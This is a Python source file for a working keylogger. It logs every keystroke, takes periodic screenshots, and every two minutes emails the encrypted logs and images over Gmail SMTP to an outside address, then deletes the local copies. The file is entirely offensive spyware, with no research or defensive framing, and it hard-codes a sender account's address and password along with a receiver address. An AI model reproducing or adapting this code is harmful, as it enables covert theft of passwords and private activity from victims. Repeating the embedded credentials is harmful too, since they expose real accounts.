import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import time
import os
from PIL import ImageGrab
import threading
from cryptography.fernet import Fernet

# Variables for the keylogger
log_file = "keylogger.txt"  # File to store logs
screenshot_dir = "screenshots"  # Directory to save screenshots
key_file = "encryption.key"  # File to store the encryption key
email = "ishida0873@gmail.com"  # Sender email
password = "lams qamh iyvc cubf"  # Sender email password
send_to_email = "aizenbankai374@gmail.com"  # Receiver email
send_interval = 120  # Interval to send emails (in seconds)
screenshot_interval = 30  # Interval to take screenshots (in seconds)

# Generate encryption key if not exists
def generate_key():
    if not os.path.exists(key_file):
        key = Fernet.generate_key()
        with open(key_file, "wb") as file:
            file.write(key)

def load_key():
    with open(key_file, "rb") as file:
        return file.read()

# Encrypt data using the encryption key
def encrypt_data(data):
    key = load_key()
    cipher = Fernet(key)
    return cipher.encrypt(data.encode())

# Decrypt data using the encryption key
def decrypt_data(data):
    key = load_key()
    cipher = Fernet(key)
    return cipher.decrypt(data).decode()

# Function to take a screenshot
def take_screenshot():
    if not os.path.exists(screenshot_dir):
        os.makedirs(screenshot_dir)
    screenshot_path = os.path.join(screenshot_dir, f"screenshot_{int(time.time())}.png")
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)

# Function to send email
def send_email():
    try:
        # Read log content
        with open(log_file, "r") as file:
            log_content = file.read()

        # Encrypt log content
        encrypted_content = encrypt_data(log_content)

        # Create email
        msg = MIMEMultipart()
        msg["From"] = email
        msg["To"] = send_to_email
        msg["Subject"] = "Keylogger Logs and Screenshots"
        msg.attach(MIMEText(encrypted_content.decode(), "plain"))

        # Attach screenshots
        if os.path.exists(screenshot_dir):
            for filename in os.listdir(screenshot_dir):
                filepath = os.path.join(screenshot_dir, filename)
                with open(filepath, "rb") as file:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(file.read())
                    encoders.encode_base64(part)
                    part.add_header(
                        'Content-Disposition',
                        f'attachment; filename={filename}'
                    )
                    msg.attach(part)

        # Send email
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(email, password)
            server.send_message(msg)

        # Clear the log file and screenshots after sending
        with open(log_file, "w") as file:
            file.write("")
        for filename in os.listdir(screenshot_dir):
            os.remove(os.path.join(screenshot_dir, filename))

    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to log keys with timestamp
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
    except AttributeError:  # For special keys like Shift, Ctrl, etc.
        with open(log_file, "a") as file:
            file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key}\n")

# Function to periodically take screenshots
def periodic_screenshots():
    while True:
        time.sleep(screenshot_interval)
        take_screenshot()

# Function to send email periodically
def periodic_email():
    while True:
        time.sleep(send_interval)
        send_email()

# Main function to start the keylogger
def main():
    generate_key()

    # Start the email sending thread
    email_thread = threading.Thread(target=periodic_email, daemon=True)
    email_thread.start()

    # Start the screenshot thread
    screenshot_thread = threading.Thread(target=periodic_screenshots, daemon=True)
    screenshot_thread.start()

    # Start the keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Ensure log file exists
    if not os.path.exists(log_file):
        with open(log_file, "w") as file:
            file.write("")
    main()
